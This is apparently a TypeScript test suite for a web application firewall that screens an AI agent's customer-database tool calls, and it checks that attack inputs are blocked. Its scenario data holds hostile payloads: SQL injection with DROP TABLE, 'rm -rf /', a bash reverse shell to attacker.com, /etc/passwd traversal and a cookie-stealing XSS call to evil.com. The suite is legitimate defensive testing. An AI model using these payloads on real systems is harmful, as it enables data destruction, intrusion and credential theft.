import axios from 'axios';
import { v4 as uuidv4 } from 'uuid';
import Redis from 'ioredis';

const GATEWAY_URL = process.env.WAF_GATEWAY_URL ?? 'http://localhost:3001';
const REDIS_URL = process.env.REDIS_URL ?? 'redis://localhost:6379';
const VALID_KEY = 'cs-agent-key-dev-001';

interface SecurityAttackScenario {
  attackCategory: string;
  name: string;
  tool: string;
  payload: Record<string, unknown>;
  customerId?: string;
  sessionId?: string;
  expectedStatus: number;
  expectedDecision: string;
  threatVerification: string;
}

const ATTACK_SCENARIOS: SecurityAttackScenario[] = [
  // 1. SQL Injection: ' OR '1'='1
  {
    attackCategory: 'SQL Injection',
    name: "Classic Authentication/Query Bypass (' OR '1'='1)",
    tool: 'search_customer',
    payload: { query: "' OR '1'='1" },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'SQL tautology bypass rejected by regex signature guard',
  },
  // 2. SQL Injection: DROP TABLE
  {
    attackCategory: 'SQL Injection',
    name: "Destructive DDL Injection ('; DROP TABLE customers; --)",
    tool: 'update_customer',
    payload: { customer_id: 'C101', name: "Robert'; DROP TABLE customers; --" },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Destructive DDL keyword matched & rejected',
  },
  // 3. Command Injection: rm -rf /
  {
    attackCategory: 'Command Injection',
    name: "OS Shell Command Execution Injection (; rm -rf /)",
    tool: 'search_customer',
    payload: { query: "customer_1; rm -rf /" },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'OS command execution signature matched & blocked',
  },
  // 4. Command Injection: Shell invocation (/bin/bash)
  {
    attackCategory: 'Command Injection',
    name: "Reverse Shell Payload (/bin/sh, powershell)",
    tool: 'update_customer',
    payload: { customer_id: 'C101', address: "/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'" },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Reverse shell invocation pattern matched & blocked',
  },
  // 5. Path Traversal: ../../etc/passwd
  {
    attackCategory: 'Path Traversal',
    name: "Directory / File Disclosure Attempt (../../etc/passwd)",
    tool: 'get_customer',
    payload: { customer_id: '../../etc/passwd' },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Dot-dot slash directory traversal attempt intercepted',
  },
  // 6. Cross-Site Scripting (XSS)
  {
    attackCategory: 'XSS Injection',
    name: "Stored / Reflected XSS Payload (<script>alert(1)</script>)",
    tool: 'send_email',
    payload: { to: '<script>alert("XSS")</script>@evil.com', subject: 'Invoice', body: '<script>fetch("http://evil.com?c="+document.cookie)</script>' },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Script tag / JavaScript DOM injection blocked',
  },
  // 7. Parameter Pollution & Array Fuzzing
  {
    attackCategory: 'Parameter Pollution',
    name: "Parameter Pollution & Array-based Structure Pollution",
    tool: 'get_customer',
    payload: { customer_id: ['C101', 'C999', 'DROP TABLE'] },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Polluted parameter object safely serialized and blocked on scope/pattern',
  },
  // 8. Oversized Input & DoS Payload
  {
    attackCategory: 'Oversized Payload DoS',
    name: "Buffer / Memory Exhaustion Payload (>5,000 bytes string)",
    tool: 'search_customer',
    payload: { query: 'A'.repeat(8000) },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Max parameter length (1000) enforced with anomaly risk escalation',
  },
  // 9. Unauthorized Cross-Tenant Access (BOLA)
  {
    attackCategory: 'BOLA / Tenant Isolation',
    name: "Cross-Tenant Unauthorized Data Exfiltration (User A -> Customer B)",
    tool: 'get_customer',
    payload: { customer_id: 'C999' },
    customerId: 'C101',
    expectedStatus: 403,
    expectedDecision: 'BLOCK',
    threatVerification: 'Out-of-scope customer access denied against session boundary',
  },
];

async function runSecurityTestSuite() {
  console.log('\n' + '█'.repeat(80));
  console.log('█  AEGIS WAF — PENETRATION & EXPLOIT RESISTANCE VERIFICATION SUITE              █');
  console.log('█  Simulating: SQLi | RCE | Path Traversal | XSS | BOLA | Replay | DoS          █');
  console.log('█'.repeat(80));

  let passed = 0;
  let failed = 0;

  for (let i = 0; i < ATTACK_SCENARIOS.length; i++) {
    const scenario = ATTACK_SCENARIOS[i];
    const requestId = uuidv4();
    const sessionId = `sess-sec-test-${Date.now()}-${i}`;

    try {
      const res = await axios.post(
        `${GATEWAY_URL}/api/waf/evaluate`,
        {
          requestId,
          tool: scenario.tool,
          parameters: scenario.payload,
          sessionId,
          customerId: scenario.customerId,
        },
        {
          headers: { Authorization: `Bearer ${VALID_KEY}`, 'Content-Type': 'application/json' },
          validateStatus: () => true,
        }
      );

      const statusMatch = res.status === scenario.expectedStatus;
      const decisionMatch = res.data.decision === scenario.expectedDecision;

      if (statusMatch && decisionMatch) {
        passed++;
        console.log(`\n🛡️  [DEFENDED] Scenario ${i + 1}: ${scenario.name}`);
        console.log(`   Threat Category: [${scenario.attackCategory}]`);
        console.log(`   WAF Decision:    ${res.data.decision} (Risk Score: ${res.data.riskScore}/100)`);
        console.log(`   Reason:          "${res.data.reason}"`);
        console.log(`   Evidence:        ${scenario.threatVerification}`);
      } else {
        failed++;
        console.log(`\n❌ [VULNERABILITY DETECTED] Scenario ${i + 1}: ${scenario.name}`);
        console.log(`   Expected: Status ${scenario.expectedStatus}, Decision ${scenario.expectedDecision}`);
        console.log(`   Received: Status ${res.status}, Decision ${res.data.decision}`);
      }
    } catch (err: any) {
      failed++;
      console.log(`\n❌ [EXCEPTION] Scenario ${i + 1}: ${scenario.name} — ${err.message}`);
    }
  }

  // 10. Replay Attack Verification (Same requestId executed twice)
  console.log(`\n────────────────────────────────────────────────────────────────────────────────`);
  console.log(`🔄 Testing Replay Attack Resistance (Identical Request ID Repeated)...`);
  try {
    const replayId = uuidv4();
    // Request 1: First Evaluation
    const res1 = await axios.post(
      `${GATEWAY_URL}/api/waf/evaluate`,
      {
        requestId: replayId,
        tool: 'get_customer',
        parameters: { customer_id: 'C101' },
        sessionId: 'sess-replay-101',
        customerId: 'C101',
      },
      { headers: { Authorization: `Bearer ${VALID_KEY}` }, validateStatus: () => true }
    );

    // Request 2: Replay of identical evaluation with same requestId
    const res2 = await axios.post(
      `${GATEWAY_URL}/api/waf/evaluate`,
      {
        requestId: replayId,
        tool: 'get_customer',
        parameters: { customer_id: 'C101' },
        sessionId: 'sess-replay-101',
        customerId: 'C101',
      },
      { headers: { Authorization: `Bearer ${VALID_KEY}` }, validateStatus: () => true }
    );

    if (res1.status === 200 && res2.status === 409 && res2.data.error === 'REPLAY_ATTACK_DETECTED') {
      passed++;
      console.log(`🛡️  [DEFENDED] Scenario 10: Replay Attack Defense`);
      console.log(`   Threat Category: [Replay & Nonce Hijacking]`);
      console.log(`   First Evaluation:  Status 200 (ALLOW)`);
      console.log(`   Replay Attempt:    Status 409 (REPLAY_ATTACK_DETECTED)`);
      console.log(`   Evidence:          Duplicate requestId rejected before entering policy pipeline`);
    } else {
      failed++;
      console.log(`❌ [FAILED] Replay attack was not intercepted (Status: ${res2.status})`);
    }
  } catch (err: any) {
    failed++;
    console.log(`❌ [EXCEPTION] Replay test error: ${err.message}`);
  }

  console.log('\n' + '═'.repeat(80));
  console.log(`📊 PENETRATION TEST REPORT: ${passed} DEFENDED | ${failed} BYPASSED | Total: ${ATTACK_SCENARIOS.length + 1}`);
  console.log('═'.repeat(80));

  if (failed > 0) {
    process.exit(1);
  }
}

runSecurityTestSuite().catch((err) => {
  console.error('Fatal penetration test error:', err);
  process.exit(1);
});
